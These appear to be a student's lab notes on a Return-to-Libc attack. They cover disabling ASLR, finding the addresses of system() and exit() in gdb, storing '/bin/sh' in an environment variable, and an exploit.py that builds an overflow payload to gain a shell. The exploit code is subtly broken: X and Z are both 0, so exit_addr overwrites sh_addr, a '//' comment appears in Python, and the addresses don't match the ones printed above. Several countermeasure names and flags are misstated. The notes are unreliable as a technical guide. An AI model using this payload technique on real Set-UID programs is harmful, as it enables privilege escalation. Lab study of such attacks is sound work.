# Return-to-Libc Lab
## Lab Setup
- turn off countermeasures
    1. no ASRL: `$ sudo sysctl -w kernel.randomize_va_space=0`
    2. no SafeGuard: add `-fno-stack-protector` flag when compiling
    3. **non-executable** stack: add `-z noexecstack` flag when compiling
    4. replace `/bin/dash`, which has a countermeasure to revoke privilege when running `Set-UID` programs: `$ sudo ln -sf /bin/zsh /bin/sh`

## Task 1: Finding out the Addresses of `libc` Functions
- in Linux, when a program runs, the `libc` library will be loaded into memory
- when ASRL is turned off, for the same program, the library is always loaded in the same memory address (for the same program, if we change it from a `Set-UID` program to a normal program, the `libc` may not be loaded to the same location)
- use the `gdb` to debug the program,  and find the address of `system()`
    - commands
        - `run` execute the target program once
        - `p` (or `print`) print out the address of `system()` and `exit()` functions
        - `gdb -q retlib` debug `retlib` in quite mode
    - open `retlib` with gdb, and set a break point at `main()`, `run`, the program will pause when it reaches `main()`, and the `libc` will be loaded, then use `p` to print out the address of `system()` and `exit()`
        ```
        $ gdb -q retlib
        Reading symbols from retlib...
        (No debugging symbols found in retlib)
        gdb-peda$ break main
        Breakpoint 1 at 0x12ef
        gdb-peda$ run
        Starting program: ...
        ...
        Breakpoint 1, 0x565562ef in main()
        gdb-peda$ p system
        $1 = {<text variable, no debug info>} 0xf7e12420 <system>
        gdb-peda$ p exit
        $2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
        gdb-peda$ quit
        $
        ```
    - we can also run `gdb` in batch mode, i.e., put `gdb` commands in a file
        - `gdb -q -batch -x gdb_command.txt ./retlib`
        - `gdb_command.txt`
            ```
            break main
            run
            p system
            p exit
            quit
            ```
## Task 2: Putting the Shell String in the Memory
- goal: jump to `system()` and get it to execute an arbitrary command, e.g., `"/bin/sh"`
- use environment variable
    - when running a program from a shell prompt, it actually spawns a child process to execute the program, and all the exported shell variables become the environment variables of the child process
    - create a shell variable `MYSHELL`: `$ export MYSHELL=/bin/sh`, we can check this via `env | grep MYSHELL` or `printenv MYSHELL` or `printenv | grep MYSHELL`
    - find the location of this variable in the memory
        - `prtenv.c`
            ```
            ...
            void main() {
                char *shell = getenv("MYSHELL");
                if(shell) {
                    printf("%x\n", (unsigned int) shell);
                }
            }
            ```
        ```
        $ gcc -o prtenv prtenv.c
        ffffe3e5
        $ gcc -o prtenv prtenv.c
        ffffe3e5
        ```

## Task 3: Launching the Attack
- when we run `retlib` with a benign input, we can know the value of `ebp` and `&buffer`
    ```
    Address of buffer[] inside bof(): 0xffffcd60
    Frame Pointer value inside bof(): 0xffffcd78
    ```
- **IMPORTANT**: if we use `p $ebp` to check the value of `ebp` in `gdb` when in `bof()`, we will get a different value, because `gdb` run this program with its absolute path, and `gdb` sets some extra environment variables
- create the payload in `badfile` with `exploit.py`
    ```
    #!/usr/bin/env python3
    import sys

    buff_addr = 0xffffcd50
    ebp       = 0xffffcd68

    content = bytearray(0xaa for i in range(300))

    X = 0
    sh_addr = 0xffffe3e5 # The address of "/bin/sh"
    content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')

    // return to system()
    Y = ebp - buff_addr + 4
    system_addr = 0xf7e12420 # The address of system()
    content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')

    Z = 0
    exit_addr = 0xf7e04f80 # The address of exit()
    content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')
    ```
- stack before return to `system()`
    ```
    High Memory Addresses
    |          +---------------------+ 
    |          |        ...          |
    |          |---------------------|    
    |          |       sh_addr       |
    |          |---------------------|
    |          |      exit_addr      |
    |          +---------------------+ 
    |          |     system_addr     | (return address)
    |          +---------------------+
    |          |      old ebp        |
    |          |---------------------| <---- ebp
    |          |        ...          |    
    |          +---------------------+
    |          |    Unused Space     |
    |          +---------------------+
    Low Memory Addresses
    ```

- stack before return to `system()`
    ```
    High Memory Addresses
    |          +---------------------+ 
    |          |        ...          |
    |          |---------------------|    
    |          |       sh_addr       |
    |          |---------------------|
    |          |      exit_addr      | (return address)
    |          +---------------------+
    |          |        ...          |    
    |          +---------------------+
    |          |    Unused Space     |
    |          +---------------------+
    Low Memory Addresses
    ```